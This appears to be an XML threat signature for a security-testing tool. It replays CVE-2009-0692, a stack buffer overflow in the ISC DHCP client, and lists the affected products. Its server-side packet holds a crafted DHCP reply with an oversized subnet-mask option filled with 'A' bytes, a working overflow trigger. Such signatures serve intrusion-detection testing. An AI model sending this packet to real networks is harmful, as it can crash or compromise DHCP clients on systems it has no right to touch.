@@ -1,0 +1,136 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="ISC DHCP dhclient script_write_params Stack Buffer Overflow"/>
+    <EngDesc display="true" value="There exists a stack buffer overflow vulnerability in ISC DHCP dhclient. The vulnerability is due to a boundary error in parsing specially crafted subnet-mask option in DHCP responses sent from a server. Attackers in a network can exploit this vulnerability by running a malicious DHCP server, or by injecting malicious content in responses sent from an authentic server.            A successful attack targeting this vulnerability could allow remote attackers to inject and execute arbitrary code on the vulnerable system within the security context of the 'root' user.            In an attack case where code execution is not successful, the affected application will terminate abnormally."/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="DHCP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="ISC_DHCP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="ISC_DHCP_ISC_DHCP_dhclient"/>
+      <item value="ISC_DHCP_ISC_DHCP_SuSE_Linux_Enterprise_Server"/>
+      <item value="ISC_DHCP_ISC_DHCP_SuSE_Linux_Enterprise_Desktop"/>
+      <item value="ISC_DHCP_ISC_DHCP_Enterprise_Linux"/>
+      <item value="ISC_DHCP_ISC_DHCP_Linux"/>
+      <item value="ISC_DHCP_ISC_DHCP_Ubuntu_Linux"/>
+      <item value="ISC_DHCP_ISC_DHCP_NetBSD"/>
+      <item value="ISC_DHCP_ISC_DHCP_Mandrake_Linux"/>
+      <item value="ISC_DHCP_ISC_DHCP_Debian_GNU/Linux"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="ISC_DHCP_dhclient_4.1.x_prior_to_4.1.0p1"/>
+      <item value="ISC_DHCP_dhclient_4.0.x_prior_to_4.0.1p1"/>
+      <item value="ISC_DHCP_dhclient_3.1.x_prior_to_3.1.2p1"/>
+      <item value="ISC_DHCP_SuSE_Linux_Enterprise_Server_9"/>
+      <item value="ISC_DHCP_SuSE_Linux_Enterprise_Server_10"/>
+      <item value="ISC_DHCP_SuSE_Linux_Enterprise_Server_11"/>
+      <item value="ISC_DHCP_SuSE_Linux_Enterprise_Desktop_10"/>
+      <item value="ISC_DHCP_SuSE_Linux_Enterprise_Desktop_11"/>
+      <item value="ISC_DHCP_Enterprise_Linux_AS_3"/>
+      <item value="ISC_DHCP_Enterprise_Linux_AS_4"/>
+      <item value="ISC_DHCP_Enterprise_Linux_ES_3"/>
+      <item value="ISC_DHCP_Enterprise_Linux_ES_4"/>
+      <item value="ISC_DHCP_Enterprise_Linux_WS_3"/>
+      <item value="ISC_DHCP_Linux_8.1"/>
+      <item value="ISC_DHCP_Linux_9.0"/>
+      <item value="ISC_DHCP_Linux_9.1"/>
+      <item value="ISC_DHCP_Linux_10.0"/>
+      <item value="ISC_DHCP_Linux_10.1"/>
+      <item value="ISC_DHCP_Linux_10.2"/>
+      <item value="ISC_DHCP_Linux_11.0"/>
+      <item value="ISC_DHCP_Linux_12.0"/>
+      <item value="ISC_DHCP_Linux_12.1"/>
+      <item value="ISC_DHCP_Linux_12.2"/>
+      <item value="ISC_DHCP_Ubuntu_Linux_6.06"/>
+      <item value="ISC_DHCP_Ubuntu_Linux_8.04"/>
+      <item value="ISC_DHCP_Ubuntu_Linux_8.10"/>
+      <item value="ISC_DHCP_Ubuntu_Linux_9.04"/>
+      <item value="ISC_DHCP_NetBSD_4.0"/>
+      <item value="ISC_DHCP_NetBSD_4.0.1"/>
+      <item value="ISC_DHCP_NetBSD_4.0.2"/>
+      <item value="ISC_DHCP_NetBSD_5.0"/>
+      <item value="ISC_DHCP_Mandrake_Linux_2008.1"/>
+      <item value="ISC_DHCP_Mandrake_Linux_2009.0"/>
+      <item value="ISC_DHCP_Mandrake_Linux_2009.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="FSC20090715-05"/>
+    <CVEID display="true" value="CVE-2009-0692"/>
+    <bugtraqID display="true" value="35668"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="c5446496555aac2a1814b7b3cfc86062"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="Complete"/>
+    <IntegImpact display="false" value="Complete"/>
+    <AvailImpact display="false" value="Complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value=""/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created display="true" value="1269003712"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar index="C" name="sourceMAC" type="ImperfectControls.MacAddress" value="null"/>
+    <NamedVar index="D" name="destMAC" type="ImperfectControls.MacAddress" value="null"/>
+    <NamedVar index="E" name="sourceIP" type="ImperfectControls.IPv4Address" value="null"/>
+    <NamedVar index="F" name="destIP" type="ImperfectControls.IPv4Address" value="null"/>
+    <NamedVar index="G" name="DHCPdestPort" type="ImperfectControls.Port" value="null"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+    <for index="B"/>
+  </Loops>
+  <PostScript/>
+  <Output Count="" index="A">
+    <Ethernet destMac="$destMAC" pktType="0800" srcMac="$sourceMAC">
+      <IP CE="false" DF="false" FragmentOffset="0000" HeaderChecksum="A996" Identification="0000" InternetHeaderLength="05" MF="false" Protocol="11" TTL="10" TotalLength="0148" TypeofService="10" Version="04" destIP="$destIP" options="" srcIP="$sourceIP">
+        <UDP checksum="A927" destPort="$DHCPdestPort" length="0134" srcPort="@random(1026,65535)">
+          <DHCP ClientHwAddr="000C29948D9A00000000000000000000" ClientIP="0.0.0.0" File="0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" Hops="00" MagicCookie="63825363" OpCode="01" Reserved="0000" RouterIP="0.0.0.0" SecondsElapsed="0000" ServerHostname="00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" ServerIP="0.0.0.0" TransactionID="9C060968" YourIP="0.0.0.0" hwAddrLen="06" hwAddrType="01">
+            <DHCP_MessageTypeOption Code="35" DHCPMessage="03" Length="01">
+              <DHCP_ServerIdentOption Code="36" Length="04" ServerIdent="172.16.1.2">
+                <DHCP_ReqIPAddrOption Code="32" Length="04" RequestedIP="172.16.8.83">
+                  <DHCP_ParamRequestListOption Code="37" Length="0A" ParamRequestList="011C02030F060C28292A" Payload="FF0000000000000000000000000000000000000000000000000000000000000000"/>
+                </DHCP_ReqIPAddrOption>
+              </DHCP_ServerIdentOption>
+            </DHCP_MessageTypeOption>
+          </DHCP>
+        </UDP>
+      </IP>
+    </Ethernet>
+  </Output>
+  <ServerSide display="1">
+    <Output Count="" index="B">
+      <Ethernet destMac="$sourceMAC" pktType="0800" srcMac="$destMAC">
+        <IP CE="false" DF="true" FragmentOffset="0000" HeaderChecksum="D0C5" Identification="0000" InternetHeaderLength="05" MF="false" Protocol="11" TTL="40" TotalLength="0158" TypeofService="00" Version="04" destIP="$sourceIP" options="" srcIP="$destIP">
+          <UDP Payload="020106009C0609680000000000000000AC1008530000000000000000000C29948D9A000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006382536335010501404141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414133040000003CFF" checksum="E0BE" destPort="" length="0144" srcPort=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
